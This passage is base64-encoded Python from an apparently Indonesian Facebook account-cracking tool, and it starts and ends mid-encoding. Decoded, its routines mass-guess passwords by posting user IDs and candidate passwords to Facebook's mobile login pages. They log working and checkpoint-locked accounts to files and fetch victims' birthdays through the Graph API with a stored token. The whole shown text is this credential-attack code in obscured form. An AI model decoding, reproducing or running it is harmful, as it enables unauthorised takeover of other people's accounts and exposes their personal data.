WVzLmdldF9kaWN0KCkua2V5cygpOg0KCQkJa3VraSA9ICgiOyIpLmpvaW4oWyAiJXM9JXMiICUgKGtleSwgdmFsdWUpIGZvciBrZXksIHZhbHVlIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKSBdKS5yZXBsYWNlKCJub3NjcmlwdD0xOyIsICIiKQ0KCQkJcHJpbnQoZiJccntCfSB84pWk4pa64pWk4pa6IHtJfXt1aWR94oCie3B3fSIpDQoJCQlvay5hcHBlbmQoIiVzfCVzIiUodWlkLCBwdykpDQoJCQlvcGVuKCJPSy8lcy5qc29uIiUodGFuZ2dhbCksImEiKS53cml0ZSgiJXN8JXNcbiIlKHVpZCwgcHcpKQ0KCQkJYnJlYWsNCgkJZWxpZiAiY2hlY2twb2ludCIgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCk6DQoJCQl0cnk6DQoJCQkJdG9rZW4gID0gb3BlbignbG9naW4vdG9rZW4uanNvbicsJ3InKS5yZWFkKCkNCgkJCQljb29raWUgPSB7J2Nvb2tpZSc6b3BlbignbG9naW4vY29va2llLmpzb24nLCdyJykucmVhZCgpfQ0KCQkJCXdpdGggcmVxdWVzdHMuU2Vzc2lvbigpIGFzIHNlczoNCgkJCQkJdHRsID0gc2VzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXM/YWNjZXNzX3Rva2VuPSVzIiUodWlkLCB0b2tlbiksY29va2llcz1jb29raWUpLmpzb24oKVsiYmlydGhkYXkiXQ0KCQkJCQltb250aCwgZGF5LCB5ZWFyID0gdHRsLnNwbGl0KCIvIikNCgkJCQkJbW9udGggPSBidWxhbl90dGxbbW9udGhdDQoJCQkJCXByaW50KGYiXHJ7SH0gfOKVpOKWuuKVpOKWuiB7SX17dWlkfeKAontwd33igKJ7ZGF5fSB7bW9udGh9IHt5ZWFyfSIpDQoJCQkJCWNwLmFwcGVuZCgiJXN8JXMiJSh1aWQsIHB3KSkNCgkJCQkJb3BlbigiQ1AvJXMuanNvbiIlKHRhbmdnYWwpLCJhIikud3JpdGUoIiVzfCVzfCVzICVzICVzXG4iJSh1aWQsIHB3LCBkYXksIG1vbnRoLCB5ZWFyKSkNCgkJCQkJYnJlYWsNCgkJCWV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KCQkJCWRheSA9ICgiICIpDQoJCQkJbW9udGggPSAoIiAiKQ0KCQkJCXllYXIgPSAoIiAiKQ0KCQkJZXhjZXB0OnBhc3MNCgkJCWNla19sb2codWlkLHB3LHVhKQ0KCQkJcHJpbnQoZiJccntIfSB84pWk4pa64pWk4pa6IHtJfXt1aWR94oCie3B3fSIpDQoJCQljcC5hcHBlbmQoIiVzfCVzIiUodWlkLCBwdykpDQoJCQlvcGVuKCJPSy8lcy5qc29uIiUodGFuZ2dhbCksImEiKS53cml0ZSgiJXN8JXNcbiIlKHVpZCwgcHcpKQ0KCQkJYnJlYWsNCgkJZWxzZToNCgkJCWNvbnRpbnVlDQoNCglsb29wICs9IDENCg0KZGVmIG1iYXNpY2ModWlkLCBmaWkpOg0KCXRyeToNCgkJdWEgPSBvcGVuKCJ1YSIsICJyIikucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXVhID0gIlN1cHBvcnRzRnJlc2NvPTEgRGFsdmlrLzIuMS4wIChMaW51eDsgVTsgQW5kcm9pZCA2LjAuMTsgU00tSjIxMEYgQnVpbGQvTU1CMjlRKSBTb3VyY2UvMSBbRkJBTi9FTUE7VU5JVFlfUEFDS0FHRS8zNDI7RkJCVi8xMDc1ODY3MDY7RkJBVi8xNzIuMC4wLjguMTgyO0ZCRFYvU00tSjIxMEY7RkJMQy9lbl9VUztGQk9QLzIwXSINCglnbG9iYWwgb2ssIGNwLCBsb29wLCB0b2tlbiwgY29va2llDQoJc3lzLnN0ZG91dC53cml0ZShmIlxye0h9W+KAol0gfOKVpOKWuuKVpOKWuiB7SH0ge2xvb3B9L3tsZW4oaWQpfSB7SX1PSyA6IHtJfXtsZW4ob2spfSB7S31DUCA6IHtLfXtsZW4oY3ApfSIpO3N5cy5zdGRvdXQuZmx1c2goKQ0KCWZvciBwdyBpbiBmaWk6DQoJCWZpaV9ndGcgPSB7fQ0KCQlwdyA9IHB3Lmxvd2VyKCkNCgkJc2VzID0gcmVxdWVzdHMuU2Vzc2lvbigpDQoJCXNlcy5oZWFkZXJzLnVwZGF0ZSh7Im9yaWdpbiI6ICJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iLCAiYWNjZXB0LWxhbmd1YWdlIjogImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43IiwgImFjY2VwdC1lbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlIiwgImFjY2VwdCI6ICJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44IiwgInVzZXItYWdlbnQiOiB1YSwgIkhvc3QiOiAibWJhc2ljLmZhY2Vib29rLmNvbSIsICJyZWZlcmVyIjogImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCAiY2FjaGUtY29udHJvbCI6ICJtYXgtYWdlPTAiLCAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6ICIxIiwgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQifSkNCgkJcCA9IHNlcy5nZXQoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi8/bmV4dCZyZWY9ZGJsJnJlZmlkPTgiKS50ZXh0DQoJCWIgPSBwYXJzZXIocCwiaHRtbC5wYXJzZXIiKQ0KCQlibCA9IFsibHNkIiwiamF6b2VzdCIsIm1fdHMiLCJsaSIsInRyeV9udW1iZXIiLCJ1bnJlY29nbml6ZWRfdHJpZXMiLCJsb2dpbiJdDQoJCWZvciBpIGluIGIoImlucHV0Iik6DQoJCQl0cnk6DQoJCQkJaWYgaS5nZXQoIm5hbWUiKSBpbiBibDpmaWlfZ3RnLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pDQoJCQkJZWxzZTpjb250aW51ZQ0KCQkJZXhjZXB0OnBhc3MNCgkJZmlpX2d0Zy51cGRhdGUoeyJlbWFpbCI6IHVpZCwicGFzcyI6IHB3LCJwcmVmaWxsX2NvbnRhY3RfcG9pbnQiOiAiIiwicHJlZmlsbF9zb3VyY2UiOiAiIiwicHJlZmlsbF90eXBlIjogIiIsImZpcnN0X3ByZWZpbGxfc291cmNlIjogIiIsImZpcnN0X3ByZWZpbGxfdHlwZSI6ICIiLCJoYWRfY3BfcHJlZmlsbGVkIjogImZhbHNlIiwiaGFkX3Bhc3N3b3JkX3ByZWZpbGxlZCI6ICJmYWxzZSIsImlzX3NtYXJ0X2xvY2siOiAiZmFsc2UiLCJfZmJfbm9zY3JpcHQiOiAidHJ1ZSJ9KQ0KCQlkZWt1ID0gc2VzLnBvc3QoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8/cmVmc3JjPWh0dHBzJTNBJTJGJTJGbWJhc2ljLmZhY2Vib29rLmNvbSUyRiZsd3Y9MTAwJnJlZmlkPTgiLGRhdGE9ZmlpX2d0ZykNCgkJaWYgImNfdXNlciIgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCk6DQoJCQlrdWtpID0gKCI7Iikuam9pbihbICIlcz0lcyIgJSAoa2V5LCB2YWx1ZSkgZm9yIGtleSwgdmFsdWUgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpIF0pLnJlcGxhY2UoIm5vc2NyaXB0PTE7IiwgIiIpDQoJCQlwcmludChmIlxye0l9IHzilaTilrrilaTilroge0l9e3VpZH3igKJ7cHd9IikNCgkJCW9rLmFwcGVuZCgiJXN8JXMiJSh1aWQsIHB3KSkNCgkJCW9wZW4oIk9LLyVzLmpzb24iJSh0YW5nZ2FsKSwiYSIpLndyaXRlKCIlc3wlc1xuIiUodWlkLCBwdykpDQoJCQlicmVhaw0KCQllbGlmICJjaGVja3BvaW50IiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLmtleXMoKToNCgkJCXRyeToNCgkJCQl0b2tlbiAgPSBvcGVuKCdsb2dpbi90b2tlbi5qc29uJywncicpLnJlYWQoKQ0KCQkJCWNvb2tpZSA9IHsnY29va2llJzpvcGVuKCdsb2dpbi9jb29raWUuanNvbicsJ3InKS5yZWFkKCl9DQoJCQkJd2l0aCByZXF1ZXN0cy5TZXNzaW9uKCkgYXMgc2VzOg0KCQkJCQl0dGwgPSBzZXMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMiJSh1aWQsIHRva2VuKSxjb29raWVzPWNvb2tpZSkuanNvbigpWyJiaXJ0aGRheSJdDQoJCQkJCW1vbnRoLCBkYXksIHllYXIgPSB0dGwuc3BsaXQoIi8iKQ0KCQkJCQltb250aCA9IGJ1bGFuX3R0bFttb250aF0NCgkJCQkJcHJpbnQoZiJccntIfSB84pWk4pa64pWk4pa6IHtLfXt1aWR94oCie3B3feKAontkYXl9IHttb250aH0ge3llYXJ9IikNCgkJCQkJY3AuYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQ0KCQkJCQlvcGVuKCJDUC8lcy5qc29uIiUodGFuZ2dhbCksImEiKS53cml0ZSgiJXN8JXN8JXMgJXMgJXNcbiIlKHVpZCwgcHcsIGRheSwgbW9udGgsIHllYXIpKQ0KCQkJCQlicmVhaw0KCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJZGF5ID0gKCIgIikNCgkJCQltb250aCA9ICgiICIpDQoJCQkJeWVhciA9ICgiICIpDQoJCQlleGNlcHQ6cGFzcw0KCQkJcHJpbnQoZiJccntIfSB84pWk4pa64pWk4pa6IHtLfXt1aWR94oCie3B3fSIpDQoJCQljcC5hcHBlbmQoIiVzfCVzIiUodWlkLCBwdykpDQoJCQlvcGVuKCJDUC8lcy5qc29uIiUodGFuZ2dhbCksImEiKS53cml0ZSgiJXN8JXNcbiIlKHVpZCwgcHcpKQ0KCQkJYnJlYWsNCgkJZWxzZToNCgkJCWNvbnRpbnVlDQoNCglsb29wICs9IDENCgkNCmRlZiBtb2JpbCh1aWQsIGZpaSk6DQoJdHJ5Og0KCQl1YSA9IG9wZW4oInVhIiwgInIiKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJdWEgPSAiU3VwcG9ydHNGcmVzY289MSBEYWx2aWsvMi4xLjAgKExpbnV4OyBVOyBBbmRyb2lkIDYuMC4xOyBTTS1KMjEwRiBCdWlsZC9NTUIyOVEpIFNvdXJjZS8xIFtGQkFOL0VNQTtVTklUWV9QQUNLQUdFLzM0MjtGQkJWLzEwNzU4NjcwNjtGQkFWLzE3Mi4wLjAuOC4xODI7RkJEVi9TTS1KMjEwRjtGQkxDL2VuX1VTO0ZCT1AvMjBdIg0KCWdsb2JhbCBvaywgY3AsIGxvb3AsIHRva2VuLCBjb29raWUNCglzeXMuc3Rkb3V0LndyaXRlKGYiXHJ7SH1b4oCiXSB84pWk4pa64pWk4pa6IHtIfSB7bG9vcH0ve2xlbihpZCl9IHtJfU9LIDoge0l9e2xlbihvayl9IHtLfUNQIDoge0t9e2xlbihjcCl9Iik7c3lzLnN0ZG91dC5mbHVzaCgpDQoJZm9yIHB3IGluIGZpaToNCgkJZmlpX2d0ZyA9IHt9DQoJCXB3ID0gcHcubG93ZXIoKQ0KCQlzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCgkJc2VzLmhlYWRlcnMudXBkYXRlKHsib3JpZ2luIjogImh0dHBzOi8vbW9iaWxlLmZhY2Vib29rLmNvbSIsICJhY2NlcHQtbGFuZ3VhZ2UiOiAiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjciLCAiYWNjZXB0LWVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLCAiYWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgiLCAidXNlci1hZ2VudCI6IHVhLCAiSG9zdCI6ICJtYmFzaWMuZmFjZWJvb2suY29tIiwgInJlZmVyZXIiOiAiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmcmVmaWQ9OCIsICJjYWNoZS1jb250cm9sIjogIm1heC1hZ2U9MCIsICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCJ9KQ0KCQlwID0gc2VzLmdldCgiaHR0cHM6Ly9tb2JpbGUuZmFjZWJvb2suY29tL2xvZ2luLz9uZXh0JnJlZj1kYmwmcmVmaWQ9OCIpLnRleHQNCgkJYiA9IHBhcnNlcihwLCJodG1sLnBhcnNlciIpDQoJCWJsID0gWyJsc2QiLCJqYXpvZXN0IiwibV90cyIsImxpIiwidHJ5X251bWJlciIsInVucmVjb2duaXplZF90cmllcyIsImxvZ2luIl0NCgkJZm9yIGkgaW4gYigiaW5wdXQiKToNCgkJCXRyeToNCgkJCQlpZiBpLmdldCgibmFtZSIpIGluIGJsOmZpaV9ndGcudXBkYXRlKHtpLmdldCgibmFtZSIpOmkuZ2V0KCJ2YWx1ZSIpfSkNCgkJCQllbHNlOmNvbnRpbnVlDQoJCQlleGNlcHQ6cGFzcw0KCQlmaWlfZ3RnLnVwZGF0ZSh7ImVtYWlsIjogdWlkLCJwYXNzIjogcHcsInByZWZpbGxfY29udGFjdF9wb2ludCI6ICIiLCJwcmVmaWxsX3NvdXJjZSI6ICIiLCJwcmVmaWxsX3R5cGUiOiAiIiwiZmlyc3RfcHJlZmlsbF9zb3VyY2UiOiAiIiwiZmlyc3RfcHJlZmlsbF90eXBlIjogIiIsImhhZF9jcF9wcmVmaWxsZWQiOiAiZmFsc2UiLCJoYWRfcGFzc3dvcmRfcHJlZmlsbGVkIjogImZhbHNlIiwiaXNfc21hcnRfbG9jayI6ICJmYWxzZSIsIl9mYl9ub3NjcmlwdCI6ICJ0cnVlIn0pDQoJCWRla3UgPSBzZXMucG9zdCgiaHR0cHM6Ly9tb2JpbGUuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLz9yZWZzcmM9aHR0cHMlM0ElMkYlMkZtYmFzaWMuZmFjZWJvb2suY29tJTJGJmx3dj0xMDAmcmVmaWQ9OCIsZGF0YT1maWlfZ3RnKQ0KCQlpZiAiY191c2VyIiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLmtleXMoKToNCgkJCWt1a2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkucmVwbGFjZSgibm9zY3JpcHQ9MTsiLCAiIikNCgkJCXByaW50KGYiXHJ7SH0gfOKVpOKWuuKVpOKWuiB7SX17dWlkfeKAontwd30iKQ0KCQkJb2suYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQ0KCQkJb3BlbigiT0svJXMuanNvbiIlKHRhbmdnYWwpLCJhIikud3JpdGUoIiVzfCVzXG4iJSh1aWQsIHB3KSkNCgkJCWJyZWFrDQoJCWVsaWYgImNoZWNrcG9pbnQiIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkua2V5cygpOg0KCQkJdHJ5Og0KCQkJCXRva2VuICA9IG9wZW4oJ2xvZ2luL3Rva2VuLmpzb24nLCdyJykucmVhZCgpDQoJCQkJY29va2llID0geydjb29raWUnOm9wZW4oJ2xvZ2luL2Nvb2tpZS5qc29uJywncicpLnJlYWQoKX0NCgkJCQl3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBzZXM6DQoJCQkJCXR0bCA9IHNlcy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcyIlKHVpZCwgdG9rZW4pLGNvb2tpZXM9Y29va2llKS5qc29uKClbImJpcnRoZGF5Il0NCgkJCQkJbW9udGgsIGRheSwgeWVhciA9IHR0bC5zcGxpdCgiLyIpDQoJCQkJCW1vbnRoID0gYnVsYW5fdHRsW21vbnRoXQ0KCQkJCQlwcmludChmIlxye0h9IHzilaTilrrilaTilroge0t9e3VpZH3igKJ7cHd94oCie2RheX0ge21vbnRofSB7eWVhcn0iKQ0KCQkJCQljcC5hcHBlbmQoIiVzfCVzIiUodWlkLCBwdykpDQoJCQkJCW9wZW4oIkNQLyVzLmpzb24iJSh0YW5nZ2FsKSwiYSIpLndyaXRlKCIlc3wlc3wlcyAlcyAlc1xuIiUodWlkLCBwdywgZGF5LCBtb250aCwgeWVhcikpDQoJCQkJCWJyZWFrDQoJCQlleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCgkJCQlkYXkgPSAoIiAiKQ0KCQkJCW1vbnRoID0gKCIgIikNCgkJCQl5ZWFyID0gKCIgIikNCgkJCWV4Y2VwdDpwYXNzDQoJCQljZWtfbG9nKHVpZCxwdyx1YSkNCgkJCXByaW50KGYiXHJ7SH0gfOKVpOKWuuKVpOKWuiB7S317dWlkfeKAontwd30iKQ0KCQkJY3AuYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQ0KCQkJb3BlbigiQ1AvJXMuanNvbiIlKHRhbmdnYWwpLCJhIikud3JpdGUoIiVzfCVzXG4iJSh1aWQsIHB3KSkNCgkJCWJyZWFrDQoJCWVsc2U6DQoJCQljb250aW51ZQ0KDQoJbG9vcCArPSAxDQoNCmRlZiBtb2JpbGwodWlkLCBmaWkpOg0KCXRyeToNCgkJdWEgPSBvcGVuKCJ1YSIsICJyIikucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXVhID0gIlN1cHBvcnRzRnJlc2NvPTEgRGFsdmlrLzIuMS4wIChMaW51eDsgVTsgQW5kcm9pZCA2LjAuMTsgU00tSjIxMEYgQnVpbGQvTU1CMjlRKSBTb3VyY2UvMSBbRkJBTi9FTUE7VU5JVFlfUEFDS0FHRS8zNDI7RkJCVi8xMDc1ODY3MDY7RkJBVi8xNzIuMC4wLjguMTgyO0ZCRFYvU00tSjIxMEY7RkJMQy9lbl9VUztGQk9QLzIwXSINCglnbG9iYWwgb2ssIGNwLCBsb29wLCB0b2tlbiwgY29va2llDQoJc3lzLnN0ZG91dC53cml0ZShmIlxye0h9W+KAol0g4pWk4pa64pWk4pa6IHtIfSB7bG9vcH0ve2xlbihpZCl9IHtJfU9LIDoge0l9e2xlbihvayl9IHtLfUNQIDoge0t9e2xlbihjcCl9Iik7c3lzLnN0ZG91dC5mbHVzaCgpDQoJZm9yIHB3IGluIGZpaToNCgkJZmlpX2d0ZyA9IHt9DQoJCXB3ID0gcHcubG93ZXIoKQ0KCQlzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCgkJc2VzLmhlYWRlcnMudXBkYXRlKHsib3JpZ2luIjogImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIsICJhY2NlcHQtbGFuZ3VhZ2UiOiAiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjciLCAiYWNjZXB0LWVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLCAiYWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgiLCAidXNlci1hZ2VudCI6IHVhLCAiSG9zdCI6ICJtYmFzaWMuZmFjZWJvb2suY29tIiwgInJlZmVyZXIiOiAiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmcmVmaWQ9OCIsICJjYWNoZS1jb250cm9sIjogIm1heC1hZ2U9MCIsICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCJ9KQ0KCQlwID0gc2VzLmdldCgiaHR0cHM6Ly9tb2JpbGUuZmFjZWJvb2suY29tL2xvZ2luLz9uZXh0JnJlZj1kYmwmcmVmaWQ9OCIpLnRleHQNCgkJYiA9IHBhcnNlcihwLCJodG1sLnBhcnNlciIpDQoJCWJsID0gWyJsc2QiLCJqYXpvZXN0IiwibV90cyIsImxpIiwidHJ5X251bWJlciIsInVucmVjb2duaXplZF90cmllcyIsImxvZ2luIl0NCgkJZm9yIGkgaW4gYigiaW5wdXQiKToNCgkJCXRyeToNCgkJCQlpZiBpLmdldCgibmFtZSIpIGluIGJsOmZpaV9ndGcudXBkYXRlKHtpLmdldCgibmFtZSIpOmkuZ2V0KCJ2YWx1ZSIpfSkNCgkJCQllbHNlOmNvbnRpbnVlDQoJCQlleGNlcHQ6cGFzcw0KCQlmaWlfZ3RnLnVwZGF0ZSh7ImVtYWlsIjogdWlkLCJwYXNzIjogcHcsInByZWZpbGxfY29udGFjdF9wb2ludCI6ICIiLCJwcmVmaWxsX3NvdXJjZSI6ICIiLCJwcmVmaWxsX3R5cGUiOiAiIiwiZmlyc3RfcHJlZmlsbF9zb3VyY2UiOiAiIiwiZmlyc3RfcHJlZmlsbF90eXBlIjogIiIsImhhZF9jcF9wcmVmaWxsZWQiOiAiZmFsc2UiLCJoYWRfcGFzc3dvcmRfcHJlZmlsbGVkIjogImZhbHNlIiwiaXNfc21hcnRfbG9jayI6ICJmYWxzZSIsIl9mYl9ub3NjcmlwdCI6ICJ0cnVlIn0pDQoJCWRla3UgPSBzZXMucG9zdCgiaHR0cHM6Ly9tb2JpbGUuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLz9yZWZzcmM9aHR0cHMlM0ElMkYlMkZtYmFzaWMuZmFjZWJvb2suY29tJTJGJmx3dj0xMDAmcmVmaWQ9OCIsZGF0YT1maWlfZ3RnKQ0KCQlpZiAiY191c2VyIiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLmtleXMoKToNCgkJCWt1a2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkucmVwbGFjZSgibm9zY3JpcHQ9MTsiLCAiIikNCgkJCXByaW50KGYiXHJ7SH0gfOKVpOKWuuKVpOKWuiB7SX17dWlkfeKAontwd30iKQ0KCQkJb2suYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQ0KCQkJb3BlbigiT0svJXMuanNvbiIlKHRhbmdnYWwpLCJhIikud3JpdGUoIiVzfCVzXG4iJSh1aWQsIHB3KSkNCgkJCWJyZWFrDQoJCWVsaWYgImNoZWNrcG9pbnQiIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkua2V5cygpOg0KCQkJdHJ5Og0KCQkJCXRva2VuICA9IG9wZW4oJ2xvZ2luL3Rva2VuLmpzb24nLCdyJykucmVhZCgpDQoJCQkJY29va2llID0geydjb29raWUnOm9wZW4oJ2xvZ2luL2Nvb2tpZS5qc29uJywncicpLnJlYWQoKX0NCgkJCQl3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBzZXM6DQoJCQkJCXR0bCA9IHNlcy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcyIlKHVpZCwgdG9rZW4pLGNvb2tpZXM9Y29va2llKS5qc29uKClbImJpcnRoZGF5Il0NCgkJCQkJbW9udGgsIGRheSwgeWVhciA9IHR0bC5zcGxpdCgiLyIpDQoJCQkJCW1vbnRoID0gYnVsYW5fdHRsW21vbnRoXQ0KCQkJCQlwcmludChmIlxye0h9IHzilaTilrrilaTilroge0t9e3VpZH3igKJ7cHd94oCie2RheX0ge21vbnRofSB7eWVhcn0iKQ0KCQkJCQljcC5hcHBlbmQoIiVzfCVzIiUodWlkLCBwdykpDQoJCQkJCW9wZW4oIkNQLyVzLmpzb24iJSh0YW5nZ2FsKSwiYSIpLndyaXRlKCIlc3wlc3wlcyAlcyAlc1xuIiUodWlkLCBwdywgZGF5LCBtb250aCwgeWVhcikpDQoJCQkJCWJyZWFrDQoJCQlleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCgkJCQlkYXkgPSAoIiAiKQ0KCQkJCW1vbnRoID0gKCIgIikNCgkJCQl5ZWFyID0gKCIgIikNCgkJCWV4Y2VwdDpwYXNzDQoJCQlwcmludChmIlxye0h9IHzilaTilrrilaTilroge0t9e3VpZH3igKJ7cHd9IikNCgkJCWNwLmFwcGVuZCgiJXN8JXMiJSh1aWQsIHB3KSkNCgkJCW9wZW4oIkNQLyVzLmpzb24iJSh0YW5nZ2FsKSwiYSIpLndyaXRlKCIlc3wlc1xuIiUodWlkLCBwdykpDQoJCQlicmVhaw0KCQllbHNlOg0KCQkJY29udGludWUNCg0KCWxvb3AgKz0gMQ0KCQ0KZGVmIGNla19sb2codWlkLHB3LHVhKToNCgltYiA9ICgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tIikNCglzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCglvcHRpb24gPSBbXQ0KCXNlcy5oZWFkZXJzLnVwZGF0ZSh7Ikhvc3QiOiAibWJhc2ljLmZhY2Vib29rLmNvbSIsImNhY2hlLWNvbnRyb2wiOiAibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6ICIxIiwib3JpZ2luIjogbWIsImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCJ1c2VyLWFnZW50IjogdWEsImFjY2VwdCI6ICJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwieC1yZXF1ZXN0ZWQtd2l0aCI6ICJtYXJrLnZpYS5ncCIsInNlYy1mZXRjaC1zaXRlIjogInNhbWUtb3JpZ2luIiwic2VjLWZldGNoLW1vZGUiOiAibmF2aWdhdGUiLCJzZWMtZmV0Y2gtdXNlciI6ICI/MSIsInNlYy1mZXRjaC1kZXN0IjogImRvY3VtZW50IiwicmVmZXJlciI6IG1iKyIvbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04IiwiYWNjZXB0LWVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLCJhY2NlcHQtbGFuZ3VhZ2UiOiAiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcifSkNCglkYXRhID0ge30NCglnZWQgPSBwYXJzZXIoc2VzLmdldChtYisiL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmcmVmaWQ9OCIsIGhlYWRlcnM9eyJ1c2VyLWFnZW50Ijp1YX0pLnRleHQsICJodG1sLnBhcnNlciIpDQoJZm0gPSBnZWQuZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQoJbGlzdCA9IFsibHNkIiwiamF6b2VzdCIsIm1fdHMiLCJsaSIsInRyeV9udW1iZXIiLCJ1bnJlY29nbml6ZWRfdHJpZXMiLCJsb2dpbiIsImJpX3hyd2giXQ0KCWZvciBpIGluIGZtLmZpbmRfYWxsKCJpbnB1dCIpOg0KCQlpZiBpLmdldCgibmFtZSIpIGluIGxpc3Q6DQoJCQlkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pDQoJCWVsc2U6DQoJCQljb250aW51ZQ0KCWRhdGEudXBkYXRlKHsiZW1haWwiOnVpZCwicGFzcyI6cHd9KQ0KCXJ1biA9IHBhcnNlcihzZXMucG9zdChtYitmbS5nZXQoImFjdGlvbiIpLCBkYXRhPWRhdGEsIGFsbG93X3JlZGlyZWN0cz1UcnVlKS50ZXh0LCAiaHRtbC5wYXJzZXIiKQ0KCWlmICJjaGVja3BvaW50IiBpbiBzZXMuY29va2llczoNCgkJZm9ybSA9IHJ1bi5maW5kKCJmb3JtIikNCgkJZHRzZyA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6ImZiX2R0c2cifSlbInZhbHVlIl0NCgkJanpzdCA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Imphem9lc3QifSlbInZhbHVlIl0NCgkJbmggICA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Im5oIn0pWyJ2YWx1ZSJdDQoJCWRhdGFEID0geyJmYl9kdHNn